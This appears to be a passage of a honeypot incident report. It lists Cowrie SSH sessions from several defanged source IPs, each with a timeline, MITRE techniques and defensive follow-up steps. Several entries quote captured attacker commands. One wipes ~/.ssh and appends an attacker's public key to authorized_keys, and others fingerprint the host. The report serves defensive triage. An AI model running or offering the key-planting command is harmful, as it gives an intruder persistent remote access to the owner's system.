| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:52:38` | `cowrie.session.connect` |
| `2026-09-09 16:52:38` | `cowrie.client.version` |
| `2026-09-09 16:52:39` | `cowrie.client.kex` |
| `2026-09-09 16:52:40` | `cowrie.login.success` |
| `2026-09-09 16:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc82d2333b19

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:52 |
| **Last Seen** | 2026-09-09 16:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:52:41` | `cowrie.session.connect` |
| `2026-09-09 16:52:41` | `cowrie.client.version` |
| `2026-09-09 16:52:43` | `cowrie.client.kex` |
| `2026-09-09 16:52:43` | `cowrie.login.success` |
| `2026-09-09 16:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-977088436eb1

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:53 |
| **Last Seen** | 2026-09-09 16:53 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:53:08` | `cowrie.session.connect` |
| `2026-09-09 16:53:08` | `cowrie.client.version` |
| `2026-09-09 16:53:09` | `cowrie.client.kex` |
| `2026-09-09 16:53:11` | `cowrie.login.success` |
| `2026-09-09 16:53:12` | `cowrie.session.params` |
| `2026-09-09 16:53:12` | `cowrie.command.input` |
| `2026-09-09 16:53:12` | `cowrie.command.failed` |
| `2026-09-09 16:53:13` | `cowrie.log.closed` |
| `2026-09-09 16:53:13` | `cowrie.session.params` |
| `2026-09-09 16:53:13` | `cowrie.command.input` |
| `2026-09-09 16:53:14` | `cowrie.session.file_download` |
| `2026-09-09 16:53:14` | `cowrie.log.closed` |
| `2026-09-09 16:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1553a405400

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:53 |
| **Last Seen** | 2026-09-09 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:53:14` | `cowrie.session.connect` |
| `2026-09-09 16:53:14` | `cowrie.client.version` |
| `2026-09-09 16:53:14` | `cowrie.client.kex` |
| `2026-09-09 16:53:16` | `cowrie.login.success` |
| `2026-09-09 16:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b6c05edcd0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 16:53 |
| **Last Seen** | 2026-09-09 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:53:35` | `cowrie.session.connect` |
| `2026-09-09 16:53:35` | `cowrie.client.version` |
| `2026-09-09 16:53:35` | `cowrie.client.kex` |
| `2026-09-09 16:53:35` | `cowrie.login.success` |
| `2026-09-09 16:53:36` | `cowrie.session.params` |
| `2026-09-09 16:53:36` | `cowrie.command.input` |
| `2026-09-09 16:53:36` | `cowrie.log.closed` |
| `2026-09-09 16:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43fba86973a7

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:53 |
| **Last Seen** | 2026-09-09 16:58 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:53:45` | `cowrie.session.connect` |
| `2026-09-09 16:53:45` | `cowrie.client.version` |
| `2026-09-09 16:53:45` | `cowrie.client.kex` |
| `2026-09-09 16:53:46` | `cowrie.login.success` |
| `2026-09-09 16:53:47` | `cowrie.session.params` |
| `2026-09-09 16:53:47` | `cowrie.command.input` |
| `2026-09-09 16:53:47` | `cowrie.command.failed` |
| `2026-09-09 16:53:47` | `cowrie.log.closed` |
| `2026-09-09 16:53:48` | `cowrie.session.params` |
| `2026-09-09 16:53:48` | `cowrie.command.input` |
| `2026-09-09 16:53:48` | `cowrie.session.file_download` |
| `2026-09-09 16:53:48` | `cowrie.log.closed` |
| `2026-09-09 16:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-695f02e9378b

| Field | Detail |
|---|---|
| **Source IP** | `101.42.41[.]164` |
| **First Seen** | 2026-09-09 16:53 |
| **Last Seen** | 2026-09-09 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:53:48` | `cowrie.session.connect` |
| `2026-09-09 16:53:48` | `cowrie.client.version` |
| `2026-09-09 16:53:49` | `cowrie.client.kex` |
| `2026-09-09 16:53:50` | `cowrie.login.success` |
| `2026-09-09 16:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.41[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.42.41[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148fa1c323fa

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 16:55 |
| **Last Seen** | 2026-09-09 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:55:18` | `cowrie.session.connect` |
| `2026-09-09 16:55:18` | `cowrie.client.version` |
| `2026-09-09 16:55:18` | `cowrie.client.kex` |
| `2026-09-09 16:55:19` | `cowrie.login.success` |
| `2026-09-09 16:55:20` | `cowrie.session.params` |
| `2026-09-09 16:55:20` | `cowrie.command.input` |
| `2026-09-09 16:55:20` | `cowrie.log.closed` |
| `2026-09-09 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc380d97d40

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 16:57 |
| **Last Seen** | 2026-09-09 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:57:03` | `cowrie.session.connect` |
| `2026-09-09 16:57:03` | `cowrie.client.version` |
| `2026-09-09 16:57:03` | `cowrie.client.kex` |
| `2026-09-09 16:57:03` | `cowrie.login.success` |
| `2026-09-09 16:57:04` | `cowrie.session.params` |
| `2026-09-09 16:57:04` | `cowrie.command.input` |
| `2026-09-09 16:57:04` | `cowrie.log.closed` |
| `2026-09-09 16:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e435c5569b4d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 16:58 |
| **Last Seen** | 2026-09-09 16:59 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:58:30` | `cowrie.session.connect` |
| `2026-09-09 16:58:33` | `cowrie.client.version` |
| `2026-09-09 16:58:33` | `cowrie.client.kex` |
| `2026-09-09 16:58:44` | `cowrie.login.success` |
| `2026-09-09 16:59:01` | `cowrie.session.params` |
| `2026-09-09 16:59:01` | `cowrie.command.input` |
| `2026-09-09 16:59:03` | `cowrie.log.closed` |
| `2026-09-09 16:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3cfee94308

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 16:58 |
| **Last Seen** | 2026-09-09 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 16:58:38` | `cowrie.session.connect` |
| `2026-09-09 16:58:38` | `cowrie.client.version` |
| `2026-09-09 16:58:38` | `cowrie.client.kex` |
| `2026-09-09 16:58:39` | `cowrie.login.success` |
| `2026-09-09 16:58:39` | `cowrie.session.params` |
| `2026-09-09 16:58:39` | `cowrie.command.input` |
| `2026-09-09 16:58:39` | `cowrie.log.closed` |
| `2026-09-09 16:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb56db9043ab

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:00 |
| **Last Seen** | 2026-09-09 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:00:10` | `cowrie.session.connect` |
| `2026-09-09 17:00:10` | `cowrie.client.version` |
| `2026-09-09 17:00:10` | `cowrie.client.kex` |
| `2026-09-09 17:00:10` | `cowrie.login.success` |
| `2026-09-09 17:00:11` | `cowrie.session.params` |
| `2026-09-09 17:00:11` | `cowrie.command.input` |
| `2026-09-09 17:00:11` | `cowrie.log.closed` |
| `2026-09-09 17:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e3a3c2f83f4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:01 |
| **Last Seen** | 2026-09-09 17:01 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:01:33` | `cowrie.session.connect` |
| `2026-09-09 17:01:34` | `cowrie.client.version` |
| `2026-09-09 17:01:34` | `cowrie.client.kex` |
| `2026-09-09 17:01:40` | `cowrie.login.success` |
| `2026-09-09 17:01:43` | `cowrie.session.params` |
| `2026-09-09 17:01:43` | `cowrie.command.input` |
| `2026-09-09 17:01:45` | `cowrie.log.closed` |
| `2026-09-09 17:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5921922d3d1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:01 |
| **Last Seen** | 2026-09-09 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:01:45` | `cowrie.session.connect` |
| `2026-09-09 17:01:45` | `cowrie.client.version` |
| `2026-09-09 17:01:45` | `cowrie.client.kex` |
| `2026-09-09 17:01:46` | `cowrie.login.success` |
| `2026-09-09 17:01:47` | `cowrie.session.params` |
| `2026-09-09 17:01:47` | `cowrie.command.input` |
| `2026-09-09 17:01:47` | `cowrie.log.closed` |
| `2026-09-09 17:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46b99fb042da

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:03 |
| **Last Seen** | 2026-09-09 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:03:21` | `cowrie.session.connect` |
| `2026-09-09 17:03:21` | `cowrie.client.version` |
| `2026-09-09 17:03:21` | `cowrie.client.kex` |
| `2026-09-09 17:03:21` | `cowrie.login.success` |
| `2026-09-09 17:03:22` | `cowrie.session.params` |
| `2026-09-09 17:03:22` | `cowrie.command.input` |
| `2026-09-09 17:03:22` | `cowrie.log.closed` |
| `2026-09-09 17:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edce58b0ea7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:04 |
| **Last Seen** | 2026-09-09 17:04 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:04:14` | `cowrie.session.connect` |
| `2026-09-09 17:04:15` | `cowrie.client.version` |
| `2026-09-09 17:04:15` | `cowrie.client.kex` |
| `2026-09-09 17:04:47` | `cowrie.login.success` |
| `2026-09-09 17:04:51` | `cowrie.session.params` |
| `2026-09-09 17:04:51` | `cowrie.command.input` |
| `2026-09-09 17:04:52` | `cowrie.log.closed` |
| `2026-09-09 17:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788b29266c3d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:04 |
| **Last Seen** | 2026-09-09 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:04:53` | `cowrie.session.connect` |
| `2026-09-09 17:04:53` | `cowrie.client.version` |
| `2026-09-09 17:04:53` | `cowrie.client.kex` |
| `2026-09-09 17:04:54` | `cowrie.login.success` |
| `2026-09-09 17:04:54` | `cowrie.session.params` |
| `2026-09-09 17:04:54` | `cowrie.command.input` |
| `2026-09-09 17:04:55` | `cowrie.log.closed` |
| `2026-09-09 17:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2d1672cb88

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-09 17:06 |
| **Last Seen** | 2026-09-09 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:06:26` | `cowrie.session.connect` |
| `2026-09-09 17:06:26` | `cowrie.client.version` |
| `2026-09-09 17:06:26` | `cowrie.client.kex` |
| `2026-09-09 17:06:26` | `cowrie.login.success` |
| `2026-09-09 17:06:27` | `cowrie.session.params` |
| `2026-09-09 17:06:27` | `cowrie.command.input` |
| `2026-09-09 17:06:27` | `cowrie.log.closed` |
| `2026-09-09 17:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54e9d11e690

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-09-09 17:06 |
| **Last Seen** | 2026-09-09 17:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:06:51` | `cowrie.session.connect` |
| `2026-09-09 17:06:51` | `cowrie.client.version` |
| `2026-09-09 17:06:51` | `cowrie.client.kex` |
| `2026-09-09 17:06:52` | `cowrie.login.success` |
| `2026-09-09 17:06:53` | `cowrie.session.params` |
| `2026-09-09 17:06:53` | `cowrie.command.input` |
| `2026-09-09 17:06:53` | `cowrie.command.failed` |
| `2026-09-09 17:06:53` | `cowrie.log.closed` |
| `2026-09-09 17:06:54` | `cowrie.session.params` |
| `2026-09-09 17:06:54` | `cowrie.command.input` |
| `2026-09-09 17:06:55` | `cowrie.session.file_download` |
| `2026-09-09 17:06:55` | `cowrie.log.closed` |
| `2026-09-09 17:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf56b2a8953

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-09-09 17:06 |
| **Last Seen** | 2026-09-09 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:06:55` | `cowrie.session.connect` |
| `2026-09-09 17:06:55` | `cowrie.client.version` |
| `2026-09-09 17:06:55` | `cowrie.client.kex` |
| `2026-09-09 17:06:56` | `cowrie.login.success` |
| `2026-09-09 17:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0738ffc06bf6

| Field | Detail |
|---|---|
| **Source IP** | `154.221.25[.]99` |
| **First Seen** | 2026-09-09 17:06 |
| **Last Seen** | 2026-09-09 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 17:06:56` | `cowrie.session.connect` |
| `2026-09-09 17:06:56` | `cowrie.client.version` |
| `2026-09-09 17:06:57` | `cowrie.client.kex` |
| `2026-09-09 17:06:57` | `cowrie.login.success` |
| `2026-09-09 17:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.25[.]99` to AbuseIPDB if not already reported
- [ ] Block `154.221.25[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76be6c0f4e8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-09 17:07 |
| **Last Seen** | 2026-09-09 17:07 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

